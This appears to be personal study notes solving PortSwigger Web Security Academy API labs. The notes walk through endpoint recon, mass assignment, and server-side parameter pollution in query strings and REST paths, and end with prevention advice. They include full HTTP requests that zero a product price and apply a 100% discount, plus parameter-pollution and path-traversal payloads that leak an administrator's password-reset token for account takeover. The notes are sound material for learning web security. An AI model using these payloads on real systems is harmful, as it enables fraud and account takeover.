first we need to know some informations — **API recon** 

- **goal:** gather info about the API to map attack surface.
- **find endpoints:** paths where API accepts requests.
    - example:
        
        ```
        GET /api/books HTTP/1.1
        Host: example.com
        
        ```
        
        endpoint = `/api/books` (returns list of books).
        
        other example: `/api/books/mystery`
        
- **for each endpoint find how to call it:** build valid http requests. check:
    - **inputs:** required vs optional params (query / path / body)
    - **methods & formats:** GET/POST/PUT/PATCH/DELETE ; JSON / XML / form-data
    - **auth & rate limits:** api key / jwt / oauth ; token in header/cookie ; throttling
- **look for docs first (if available):** human docs (examples) or machine docs (openapi/swagger/openapi.json). start recon from docs if public.
- **if docs not public:**
    - crawl app with Burp Scanner or use Burp browser.
    - always check common paths: `/api`, `/swagger/index.html`, `/openapi.json`, `/swagger-ui.html`
    - if you find `/api/swagger/v1/users/123` then try base paths: `/api/swagger/v1`, `/api/swagger`, `/api`
    - you can also use common-path wordlist with Intruder/fuzzer to find hidden endpoints/docs
    
    lets solve first lab 
    1) go to ur account try to change email and the request will be like PATCH /api/user/wiener
    2) try to go to the base path by just leaving the /api and you will find the api documentation
    3) go to the lab url and add at the end /api and go to the api documentation page 
    4) choose delete and put Carlos and hit submit to delete the account 
    
    also during ur testing always try different methods 
    
    - `GET` - Retrieves data from a resource.
    - `PATCH` - Applies partial changes to a resource.
    - `OPTIONS` - Retrieves information on the types of request methods that can be used on a resource.
    - `TRACE` - Used during debugging phase.
    - `POST` - Sends data to the website.
    
    also try different content types 
    XML and JSON.
    
    - Trigger errors that disclose useful information.
    - Bypass flawed defenses.
    - Take advantage of differences in processing logic. For example, an API may be secure when handling JSON data but susceptible to injection attacks when dealing with XML.
    
    always make sure to check the errors they can be useful sometimes
    
    solving second lab 
    1) open burp go to the product page and refresh
    2) capture  a  get request has the price url and wend you send it it returns the price of the product
    3) try different methods POST will say method not accepted try PATCH it will say unauthorized (different error that's good)
    4) log into ur account and try to send the same request with an authenticated session id and get even one more different error
    
    ```python
    HTTP/2 400 Bad Request
    Content-Type: application/json; charset=utf-8
    X-Frame-Options: SAMEORIGIN
    Content-Length: 93
    {"type":"ClientError","code":400,"error":"Only 'application/json' Content-Type is supported"}
    ```
    
    so from here you get to know that it accepts only Content-Type : application/json
    5)add that to ur request and find another error says 
    price parameter is missing (we're trying to change the price now so instead of sending a request to check the price we're trying to change its value) 
    
    6)add the price parameter ur request should look like 
    
    ```python
    PATCH /api/products/1/price HTTP/2
    Host: [0a30001504703b068016cba600040093.web-security-academy.net](http://0a30001504703b068016cba600040093.web-security-academy.net/)
    Cookie: session=e2tWMvEci0fMyNd0Ej5IG0n2oPyc4Iew
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0
    Accept: */*
    Accept-Language: en-GB,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: https://0a30001504703b068016cba600040093.web-security-academy.net/product?productId=1
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Priority: u=4
    Te: trailers
    Content-Type: application/json
    Content-Length: 93
    
    {
    "price":0
    }
    ```
    
    hit send and watch urself able to change the actual price of the product on the website
    
     
    
    **Hidden endpoints & params (short notes, your style)**
    
    **Using Intruder to find hidden endpoints**
    
    - start from a known endpoint, e.g.
        
        ```
        PUT /api/user/update
        ```
        
    - replace the changing part with a payload position and use Intruder wordlists (common verbs/functions):
        - `update`, `delete`, `add`, `create`, `remove`, `list`, `details`, `archive`, etc.
    - include app-specific words you found in recon (routes, resource names).
    - run controlled scans (slow, on non-critical objects) so you don’t break data.
    
    **Finding hidden parameters**
    
    - undocumented params can change app behavior — try to discover them.
    - tools to help:
        - **Burp Intruder**: brute-force param names using a wordlist (replace or add params).
        - **Param Miner BApp**: auto-guess many param names (up to 65,536) based on scope.
        - **Content discovery tool**: finds unlinked content and hidden params.
    - include app-relevant names in your lists (fields from JS, docs, frontend).
    
    **Mass assignment (auto-binding)**
    
    - what it is: frameworks auto-bind request params to internal object fields → can create unexpected/hidden params.
    - how to spot it: inspect GET responses for object fields that aren’t in the update request.
        
        Example:
        
        ```
        PATCH /api/users/123
        { "username": "wiener", "email": "wiener@example.com" }
        
        ```
        
        But GET `/api/users/123` returns:
        
        ```
        { "id": 123, "name":"John Doe", "email":"john@example.com", "isAdmin":"false" }
        
        ```
        
        → `id` and `isAdmin` might be bindable hidden params.
        
    
    **Testing mass assignment**
    
    - try adding hidden param to update payload:
        
        ```
        { "username":"wiener", "email":"wiener@example.com", "isAdmin": false }
        
        ```
        
    - test invalid value:
        
        ```
        { "isAdmin": "foo" }
        
        ```
        
        - if "foo" changes behavior, server is parsing the param.
    - test privilege change:
        
        ```
        { "isAdmin": true }
        
        ```
        
        - then check the app as that user — can you access admin pages?
    - if bound without validation → possible privilege escalation.

solving the third lab 
**Exploiting a mass assignment vulnerability**

1)log in add item to cart capture a GET /api/checkout request by trying to place the item
2)send it to repeater hit send and get the response
looks like this 

```python
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 153
{"chosen_discount":{"percentage":0},
"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
```

here you find out that there an array parmater called chosen discount sent with the get request

3) add that parmater POST /api/checkout
and change the value to 100% 
request should look like this 

```python
POST /api/checkout HTTP/2
Host: [0a2d004d042a727480d1f3aa00c40091.web-security-academy.net](http://0a2d004d042a727480d1f3aa00c40091.web-security-academy.net/)
Cookie: session=OXDVZSsR1xK0d0L3gkwisri83i6wbyNn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2d004d042a727480d1f3aa00c40091.web-security-academy.net/cart
Content-Type: text/plain;charset=UTF-8
Content-Length: 155
Origin: [https://0a2d004d042a727480d1f3aa00c40091.web-security-academy.net](https://0a2d004d042a727480d1f3aa00c40091.web-security-academy.net/)
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
{
"chosen_discount":{
"percentage":100
},
"chosen_products":[
{
"product_id":"1",
"name":"Lightweight \"l33t\" Leather Jacket",
"quantity":1,
"item_price":133700}
]
}
```

4) hit send and get the item for free

**Preventing API vulnerabilities (short notes, your style)**

- **design secure from day one:** security isn't an afterthought — bake it into the API design.
- **secure docs:**
    - lock docs if the API is private (don’t expose `openapi.json`/swagger publicly).
    - keep docs up-to-date so testers see the real attack surface.
- **allowlist HTTP methods:** only accept the methods you need (e.g., allow `GET`/`POST` where required; block others).
- **validate content-type:** check `Content-Type` on every request/response and reject unexpected formats.
- **generic errors:** return generic error messages (no stack traces, no internal details).
- **protect all versions:** apply protections to old/dev/staging API versions too — not just current production.
- **prevent mass-assignment:**
    - **allowlist** fields the user is allowed to update.
    - **blocklist** sensitive/internal fields (e.g., `isAdmin`, `role`, `createdAt`) so they can’t be updated by clients.
- **quick checklist to implement:**
    - auth + authorization per endpoint (least privilege).
    - input validation + strict schema checks (type, length, enum).
    - rate limiting and throttling.
    - logging + monitoring for suspicious activity.
    - automated tests that assert disallowed fields stay immutable.

**Server-side parameter pollution**

you can manipulate the parameter before sending it to the API 
examples:
1)**Truncating query strings: use encoded # =%23**
instead of sending the request like this 

`GET /users/search?name=attacker&publicProfile=true`

you can send it like 
`GET /users/search?name=attacker#victim&publicProfile=true`

so the api might show the victim information in this way 

2)**Injecting invalid parameters: use encoded & =%26**

for example :
`GET /users/search?name=attacker&victim=xyz&publicProfile=true`

it might send the victim and the attacker information 

3)**Injecting valid parameters**

you can add another valid parameter to test for the website reaction 
for example 
`GET /users/search?name=peter&email=foo&publicProfile=true`

4)**Overriding existing parameters**

you can test this by overriding the original parameter for example 
by using &
`GET /users/search?name=peter&name=carlos&publicProfile=true`

and this will show us how the website will procces that for example 

if you try `?name=peter%26name=carlos`. The internal API will see two `name` parameters. Different backends parse duplicates differently:

- **PHP**: keeps the *last* one → searches for `carlos`.
- **ASP.NET**: may combine them → `peter,carlos`.
- **Node/Express**: often keeps the *first* one → `peter`.

lets solve lab number 4 :Exploiting server-side parameter pollution in a query string

1)go to forget password page and put administrator
2)send the request to repeater and try a usernames that you know it doesn't exist example administratorx (see the response says invalid username)
3)try to add another parameter to the request to see if it accepts additional parameter
for example 
username=administrator&test=s
the response will be like 

`HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 40`

`{`

`"error": "Parameter is not supported."`

`}`

means that it accepts another parameter but its not called test 
4)here we will use truncate to see if it leaks the other parameter name 
send 
username=administrator%23
its like you cut the rest of the request so it just sends the username
`HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 33`

`{"error": "Field not specified."}`

bingo: the parameter name is feild

5)send the request of username=administrator%26field=x%23 it will give you Invalid field
so send the request to the intruder the fuzz valid feild

6) the feild=email works and it send you the email with the response

username=administrator%26field=email%23

`HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 66`

`{`

`"type":"email",`

`"result":"*****@normal-user.net”`

`}`
what it we try to make it send the reset token too ?

7)you can check to the reset token feild name by checking the js file or in wild you can by manually trying to change ur account password and see the parameter in the url 
it will be 
reset_token

8)send the request by adding the feild reset token then truncate the rest of the request you will get the reset toke with the response

username=administrator%26field=reset_token%23

`HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 66`

`{`

`"type":"reset_token",`

`"result":"mvpeyh0h77g59sjshrwc0urvoan4vx8l"`

`}`

9)navigate to the reset password page using the token smth like 
https://0a8000a8032095d480c82b8000e70036.web-security-academy.net/forgot-password?reset_token=123456789

then reset the password of the admin and delete the user carlos

sometimes it uses urls path in parameters rather than the query string.
so we will use a method like path travesal to get the intended data 
so for example instead of this 
`GET /api/private/users/peter`
you will use this 
`GET /api/private/users/peter/../../admin`
in order to get out of the users path and go to admin path and get the data there 
../ is used to get back a step in systems like cd .. 

lets solve the last lab
 **Exploiting server-side parameter pollution in a REST URL**

1)try adding some stuff to the username for example
administrator= ,administrator?, administrator#
to test if you get different error 
you will get 

`"type": "error",
"result": "Invalid route. Please refer to the API definition"`

that a good indicator cuz now we know that we have a route that it's trying to fetch

2)now trying to get out of the administrator url and visit others
try ../../administrator wont work so try increase the steps back and at 5th time 
username=../../../../../administrator you will get a different error means that we got back but there's no file called administrator here 
error:

`{
"error": "Unexpected response from API server:\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Not Found<\/title>\n<\/head>\n<body>\n    <h1>Not found<\/h1>\n    <p>The URL that you requested was not found.<\/p>\n<\/body>\n<\/html>\n"
}`

3)no we should fuzz the api files to get valid one and it will be 
username=../../../../../openapi.json#
dont forget to use # to truncate the rest 
you will get 

`{
"error": "Unexpected response from API server:\n{\n  \"openapi\": \"3.0.0\",\n  \"info\": {\n    \"title\": \"User API\",\n    \"version\": \"2.0.0\"\n  },\n  \"paths\": {\n    \"/api/internal/v1/users/{username}/field/{field}\": {\n      \"get\": {\n        \"tags\": [\n          \"users\"\n        ],\n        \"summary\": \"Find user by username\",\n        \"description\": \"API Version 1\",\n        \"parameters\": [\n          {\n            \"name\": \"username\",\n            \"in\": \"path\",\n            \"description\": \"Username\",\n            \"required\": true,\n            \"schema\": {\n        ..."
}`
now you have an idea of how the api route works 
it looks smth like this`/api/internal/v1/users/{username}/field/{field}`

4)so now lets put that api route to see what will we get
request:
username=../../../../../api/internal/v1/users/{username}/field/{field}# // dont forget to truncate or maybe use ‘?’

response:

HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 88

{
"type": "error",
"result": "The provided username \"{username}\" does not exist"
}

means it need a username and a feild we already have this 

5)put the username as and the feild as passwordResetToken // you can get the feild name from the js static file by inspecting the reset password page or in wild by simply trying the normal flow on a known account and get the name from the url 

request :

```python
POST /forgot-password HTTP/2
Host: [0aef00c50429e37d80c7e48700be006e.web-security-academy.net](http://0aef00c50429e37d80c7e48700be006e.web-security-academy.net/)
Cookie: session=P4LPsqXF8U8LOkpjSkMDTJYJQsRy8b3C
Content-Length: 123
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Content-Type: x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: */*
Origin: [https://0aef00c50429e37d80c7e48700be006e.web-security-academy.net](https://0aef00c50429e37d80c7e48700be006e.web-security-academy.net/)
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aef00c50429e37d80c7e48700be006e.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
csrf=whBvKWxQGfoB90mabu5NlLhv6cDKw6QY&username=../../../../../api/internal/v1/users/administrator/field/passwordResetToken#
```
